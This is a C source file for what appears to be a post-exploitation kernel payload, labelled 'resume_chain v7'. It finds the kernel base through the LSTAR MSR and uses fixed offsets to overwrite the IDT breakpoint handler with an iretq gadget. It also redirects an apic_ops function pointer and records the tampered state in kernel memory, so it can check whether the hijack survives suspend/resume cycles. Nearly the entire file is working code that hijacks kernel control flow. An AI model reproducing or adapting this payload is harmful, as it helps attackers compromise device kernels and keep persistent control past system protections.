#include <stdint.h>

/*
 * resume_chain v7 — doreti_iret bounce test
 *
 * Strategy: Instead of a complex ROP chain, use the CPU's own trap
 * mechanism as a trampoline:
 *
 *   1. Set IDT[3] handler = doreti_iret (just `iretq`)
 *   2. Set apic_ops[2] = xapic_mode - 1 (hoping it's a CC/INT3 byte)
 *   3. On call: CC → INT3 → pushes {RIP=xapic_mode, CS, RFLAGS, RSP, SS}
 *   4. doreti_iret = iretq → pops everything back → xapic_mode executes
 *   5. xapic_mode: mov eax,1; ret → clean return!
 *
 * This is self-sustaining: works for ALL CPUs, ALL suspend/resume cycles.
 * No chain data, no IST stacks, no shared state.
 *
 * Modes:
 *   0x1: SAFE_ARM — IDT[3]=doreti_iret, apic_ops[2]=xapic_mode (no CC, baseline)
 *   0x2: BOUNCE_ARM — IDT[3]=doreti_iret, apic_ops[2]=xapic_mode-1 (CC bounce)
 *   0x3: READBACK — dump current IDT[3] + apic_ops[2] state after resume
 */

#define MAGIC_RSCN       0x5253434E

/* Offsets */
#define OFF_IDT          0x64cdc80
#define OFF_APIC_OPS     0x1934AC8   /* relative to ktext_base */
#define IDT_ENTRY_SIZE   16

/* Gadget: doreti_iret = just `iretq` */
#define OFF_DORETI_IRET  (-0x9cf84c)   /* relative to kdata_base, i.e. in ktext */

#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218

/* Persistence area */
#define PERSIST_BASE     0x200
#define P_SENTINEL       0x00
#define P_IDT3_ORIG_LO   0x08
#define P_IDT3_ORIG_HI   0x10
#define P_IDT3_ARMED_LO  0x18
#define P_IDT3_ARMED_HI  0x20
#define P_APIC2_ORIG     0x28
#define P_APIC2_ARMED    0x30
#define P_MODE           0x38

#define SENTINEL_VAL     0xDEAD1D7AB00CE007ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

static inline void write1(uint64_t addr, uint8_t val)
{
    *(volatile uint8_t *)addr = val;
}

static inline uint16_t read2(uint64_t addr)
{
    return *(volatile uint16_t *)addr;
}

static inline void write2(uint64_t addr, uint16_t val)
{
    *(volatile uint16_t *)addr = val;
}

static inline uint32_t read4(uint64_t addr)
{
    return *(volatile uint32_t *)addr;
}

static inline void write4(uint64_t addr, uint32_t val)
{
    *(volatile uint32_t *)addr = val;
}

/*
 * Write a full handler address into an IDT entry.
 * Preserves selector, type/attr. Sets IST to specified value.
 *
 * IDT entry layout (16 bytes):
 *   [0:1]   offset[15:0]
 *   [2:3]   segment selector
 *   [4]     IST (bits 0-2)
 *   [5]     type/attr (P, DPL, type)
 *   [6:7]   offset[31:16]
 *   [8:11]  offset[63:32]
 *   [12:15] reserved
 */
static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t ist)
{
    uint16_t off_lo  = (uint16_t)(handler & 0xFFFF);
    uint16_t off_mid = (uint16_t)((handler >> 16) & 0xFFFF);
    uint32_t off_hi  = (uint32_t)((handler >> 32) & 0xFFFFFFFF);

    /* Write offset[15:0] */
    write2(idt_entry_addr + 0, off_lo);
    /* Preserve selector at +2 */
    /* Write IST at byte 4 (preserve upper bits) */
    uint8_t byte4 = read1(idt_entry_addr + 4);
    write1(idt_entry_addr + 4, (byte4 & 0xF8) | (ist & 0x07));
    /* Preserve type/attr at byte 5 */
    /* Write offset[31:16] */
    write2(idt_entry_addr + 6, off_mid);
    /* Write offset[63:32] */
    write4(idt_entry_addr + 8, off_hi);
}

/* Read handler address from IDT entry */
static uint64_t idt_get_handler(uint64_t idt_entry_addr)
{
    uint16_t off_lo  = read2(idt_entry_addr + 0);
    uint16_t off_mid = read2(idt_entry_addr + 6);
    uint32_t off_hi  = read4(idt_entry_addr + 8);
    return ((uint64_t)off_hi << 32) | ((uint64_t)off_mid << 16) | off_lo;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    for (int i = 0; i < 140; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;

    out32[0] = MAGIC_RSCN;
    out[1] = kdata_base;
    out[2] = ktext_base;

    uint64_t idt_base = kdata_base + OFF_IDT;
    uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;

    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
    uint64_t apic_ops_2 = apic_ops_addr + 2 * 8;
    uint64_t original_xapic = read8(apic_ops_2);

    uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
    uint64_t persist = kdata_base + PERSIST_BASE;

    /* Common info */
    out[3] = doreti_iret;      /* computed doreti_iret address */
    out[4] = original_xapic;   /* current apic_ops[2] (xapic_mode) */
    out[5] = original_xapic - 1; /* xapic_mode - 1 (CC bounce target) */

    if (mode == 0x1) {
        /*
         * MODE 1: SAFE_ARM — baseline test
         * Change IDT[3] handler to doreti_iret, IST=0
         * Keep apic_ops[2] = original xapic_mode (NO CC byte)
         *
         * This tests: does changing IDT[3] handler break suspend/resume?
         * INT3 should never fire since apic_ops[2] = xapic_mode (not CC byte).
         */

        /* Save original IDT[3] */
        uint64_t idt3_lo = read8(idt3_addr);
        uint64_t idt3_hi = read8(idt3_addr + 8);
        write8(persist + P_IDT3_ORIG_LO, idt3_lo);
        write8(persist + P_IDT3_ORIG_HI, idt3_hi);

        /* Read original handler */
        uint64_t orig_handler = idt_get_handler(idt3_addr);

        /* Set IDT[3] handler = doreti_iret, IST = 0 */
        idt_set_handler(idt3_addr, doreti_iret, 0);

        /* Read back */
        uint64_t idt3_lo_new = read8(idt3_addr);
        uint64_t idt3_hi_new = read8(idt3_addr + 8);
        write8(persist + P_IDT3_ARMED_LO, idt3_lo_new);
        write8(persist + P_IDT3_ARMED_HI, idt3_hi_new);
        uint64_t new_handler = idt_get_handler(idt3_addr);

        /* Keep apic_ops[2] = original (SAFE) */
        write8(persist + P_APIC2_ORIG, original_xapic);
        write8(persist + P_APIC2_ARMED, original_xapic);
        write8(persist + P_MODE, 0x1);
        write8(persist + P_SENTINEL, SENTINEL_VAL);

        out[6] = orig_handler;    /* original IDT[3] handler */
        out[7] = new_handler;     /* should be doreti_iret */

        out32[1] = 0x0001;

    } else if (mode == 0x2) {
        /*
         * MODE 2: BOUNCE_ARM — the real test
         * IDT[3] handler = doreti_iret, IST = 0
         * apic_ops[2] = xapic_mode - 1
         *
         * If xapic_mode-1 is CC (INT3 padding):
         *   call → CC → INT3 → push trap frame → doreti_iret → iretq
         *   → xapic_mode → mov eax,1; ret → clean return!
         *
         * If xapic_mode-1 is NOT CC:
         *   some other instruction executes → likely crash
         */

        /* Save original IDT[3] */
        uint64_t idt3_lo = read8(idt3_addr);
        uint64_t idt3_hi = read8(idt3_addr + 8);
        write8(persist + P_IDT3_ORIG_LO, idt3_lo);
        write8(persist + P_IDT3_ORIG_HI, idt3_hi);

        /* Set IDT[3] handler = doreti_iret, IST = 0 */
        idt_set_handler(idt3_addr, doreti_iret, 0);

        uint64_t idt3_lo_new = read8(idt3_addr);
        uint64_t idt3_hi_new = read8(idt3_addr + 8);
        write8(persist + P_IDT3_ARMED_LO, idt3_lo_new);
        write8(persist + P_IDT3_ARMED_HI, idt3_hi_new);

        /* Set apic_ops[2] = xapic_mode - 1 */
        uint64_t bounce_target = original_xapic - 1;
        write8(apic_ops_2, bounce_target);

        write8(persist + P_APIC2_ORIG, original_xapic);
        write8(persist + P_APIC2_ARMED, bounce_target);
        write8(persist + P_MODE, 0x2);
        write8(persist + P_SENTINEL, SENTINEL_VAL);

        /* Verify write */
        uint64_t verify = read8(apic_ops_2);

        out[6] = idt_get_handler(idt3_addr);  /* should be doreti_iret */
        out[7] = verify;                       /* should be xapic_mode - 1 */

        out32[1] = 0x0002;

    } else if (mode == 0x3) {
        /*
         * MODE 3: READBACK — check state after resume
         */
        uint64_t sentinel = read8(persist + P_SENTINEL);
        uint64_t armed_mode = read8(persist + P_MODE);

        /* Current state */
        uint64_t cur_handler = idt_get_handler(idt3_addr);
        uint64_t cur_apic2 = read8(apic_ops_2);

        /* Saved state */
        uint64_t saved_apic2_armed = read8(persist + P_APIC2_ARMED);
        uint64_t saved_apic2_orig = read8(persist + P_APIC2_ORIG);

        /* IDT[3] verdict */
        uint64_t saved_idt3_armed_lo = read8(persist + P_IDT3_ARMED_LO);
        uint64_t saved_idt3_armed_hi = read8(persist + P_IDT3_ARMED_HI);
        uint64_t cur_idt3_lo = read8(idt3_addr);
        uint64_t cur_idt3_hi = read8(idt3_addr + 8);

        int idt_persisted = (cur_idt3_lo == saved_idt3_armed_lo &&
                             cur_idt3_hi == saved_idt3_armed_hi);

        /* Verdicts in first visible slots */
        out[3] = idt_persisted ? 0x50455253495354ULL : 0x524553544F5245ULL;
        out[4] = (cur_apic2 == saved_apic2_armed) ? 0x50455253495354ULL :
                 (cur_apic2 == saved_apic2_orig)   ? 0x524553544F5245ULL :
                                                      0x554E4B4E4F574EULL;
        out[5] = sentinel;
        out[6] = armed_mode;          /* which mode was used to arm */
        out[7] = cur_handler;         /* current IDT[3] handler */

        /* Extended */
        out[8] = cur_apic2;           /* current apic_ops[2] */
        out[9] = saved_apic2_armed;   /* what we set */
        out[10] = doreti_iret;        /* expected handler */

        out32[1] = 0x0003;

    } else {
        out32[1] = 0xFF;
    }

    out[131] = 0xdeadbeefcafe0070ULL;  /* v7 marker */
    return 0;
}
